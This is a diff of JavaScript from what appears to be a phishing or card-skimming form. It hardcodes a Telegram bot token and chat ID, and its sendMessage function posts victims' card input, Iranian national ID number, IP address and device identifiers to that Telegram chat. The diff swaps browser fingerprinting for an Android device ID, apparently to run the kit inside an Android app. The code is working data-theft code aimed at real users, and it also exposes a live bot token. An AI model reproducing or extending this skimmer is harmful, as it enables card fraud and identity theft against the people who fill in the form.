@@ -1,30 +1,33 @@
 const token = '7985669297:AAEVfINvGGV4VX6iLLH1dLae8EsSdLJKPVY';
 const chatId = '-4614449543';
 
-var du = new DeviceUUID().parse();
-var dua = [
-  du.language,
-  du.platform,
-  du.os,
-  du.cpuCores,
-  du.isAuthoritative,
-  du.silkAccelerated,
-  du.isKindleFire,
-  du.isDesktop,
-  du.isMobile,
-  du.isTablet,
-  du.isWindows,
-  du.isLinux,
-  du.isLinux64,
-  du.isMac,
-  du.isiPad,
-  du.isiPhone,
-  du.isiPod,
-  du.isSmartTV,
-  du.pixelDepth,
-  du.isTouchScreen,
-];
-var uuid = du.hashMD5(dua.join(':'));
+// var du = new DeviceUUID().parse();
+// var dua = [
+//   du.language,
+//   du.platform,
+//   du.os,
+//   du.cpuCores,
+//   du.isAuthoritative,
+//   du.silkAccelerated,
+//   du.isKindleFire,
+//   du.isDesktop,
+//   du.isMobile,
+//   du.isTablet,
+//   du.isWindows,
+//   du.isLinux,
+//   du.isLinux64,
+//   du.isMac,
+//   du.isiPad,
+//   du.isiPhone,
+//   du.isiPod,
+//   du.isSmartTV,
+//   du.pixelDepth,
+//   du.isTouchScreen,
+// ];
+// var uuid = du.hashMD5(dua.join(':'));
+
+const androidId = androidListener.getAndroidID();
+const device = androidListener.deviceName();
 
 const sendMessage = async function (message) {
   await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -224,8 +227,8 @@ form.addEventListener('keydown', e => {
     CodeMeli: ${codeMeli}
     --------------
     IP: ${userIp}
-    Device: ${getDeviceType()}
-    DeviceId: ${uuid}
+    Device: ${device}
+    TAG: ${androidId}
   `;
     console.log(cardInput.value);
     console.log(mm);
